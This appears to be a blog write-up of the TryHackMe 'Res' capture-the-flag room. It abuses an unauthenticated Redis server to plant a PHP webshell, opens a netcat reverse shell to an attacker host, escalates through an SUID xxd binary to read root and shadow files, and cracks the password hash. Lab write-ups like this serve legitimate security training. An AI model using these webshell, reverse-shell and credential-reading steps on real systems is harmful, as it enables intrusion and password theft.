---
layout: post
title: THM RES  writeup
excerpt_separator: <!--more-->
---
<img src="/img/0.head.png">
<!--more→
<p></p>
<a href="https://tryhackme.com/room/res" target="_blank" > Click here to access this box on tryHackMe.com</a>
<hr>


<p>Enumerating  ports with an NMAP Scan.</p>
<img src="/img/res/1.nmap-scan-1.png">

<p>Only one port shows to be open. Let’s enumerate it further for version,service and os detection. </p>
<img src="/img/res/2.nmap-scan-2.png">

<p>Now let's check all 65k ports with nmap.</p>
<img src="/img/res/">


<p>We only have two open ports. Port 80 running Apache and port 6379 running Redis db. version 6.0.7</p>
<img src="/img/res/4.nmap-scan-2.png">

<p>Navigating in a web browser to port 80 we find the default Apache web page. Let’s quickly check the source code, start up gobuster. </p>
<img src="/img/res/3.defult-apache-page.png">

<p>Nothing of interest in the default web page’s source code. Let’s get gobuster brute forcing sub directories</p>
<img src="/img/res/5.gobuster-start.png">

<p>while we wait on gobuster, let’s do some research on the Redis 6.0.7 db </p>
<img src="/img/res/">

<p>After installing the redis-server on my local machine and enumerating the Redis db I discovered I could connect to the db via shell with no authentication. I also found a possible username vianka by running the info command  </p>
<img src="/img/res/6.Redis-db-enum.png">


<p>Since ssh isn’t open we’re going to need a webshell.</p>
<p> here’s a link to an article about this https://book.hacktricks.xyz/pentesting/6379-pentesting-redis  
<img src="/img/res/7.hacktricks-webshell.png">

<p>I assumed the Apache was serving in the default directories due to the default web page I followed along with the post to test is this was vulnerable   </p>
<p>config set dir /var/www/html</p>
<p>config set dbfilename shell.php</p>
<p> set test "<?php system($_GET['cmd']);?>"</p>

<img src="/img/res/8.redis-commands-test-php.png">

<p>Navigating to <host ip> <host ip>/ redis.php  we can confirm the php is working. Now we need to upload a php reverse shell payload</p>
<img src="/img/res/9.php-test-payload.png">

<p>Let’s setup a listener with netcat on our local machine </p>
<img src="/img/res/10.setup-listner.png">

<p>Now change test from "<?php phpinfo(); ?>" to  "<?php system($_GET['cmd']);?>" using the set command </p>
<p> set test "<?php system($_GET['cmd']);?>" </p>
<p> now we can issue command injection in the web browser</p>
<p>http://[host]/shell.php?cmd=nc [attack machine] [port] -e /bin/sh</p>





<p>Now we have a shell on the host</p>
<img src="/img/res/16.first-shell.png">




<p>Now we have a shell on the host</p>
<img src="/img/res/16.first-shell.png">

<p>Let’s cat the user.txt file and begin eumurnating for a privilege escalation </p>
<img src="/img/res/17.cat.user.txt.png">



<p>If you run linpease there will find the xxd binary with SUID set. Let’s check GTFObins </p>
<img src="/img/res/19.gtfo.bins.png">

<p>here's how I abused the xxd binary:  </p>
<p>LFILE=/root/root.txt  </p>
<p> usr/bin/xxd "$LFILE" | xxd -r usr/bin/xxd "$LFILE" | xxd -r </p>
<img src="/img/res/18.root.txt.png">

<p>To complete the box we still need the local users password. Let’s abuse the xxd binary so we read the shadow file. Copy the users hash and try and crack it offline</p>
<img src="/img/res/20.user-hash.png">

<p>Here I used a hashcat with the rockyou password list, set the mode to 1800 and hashcat cracked the password in 5 seconds. Now we can complete this box with the user password.   </p>
<img src="/img/res/22.hashcat.png">
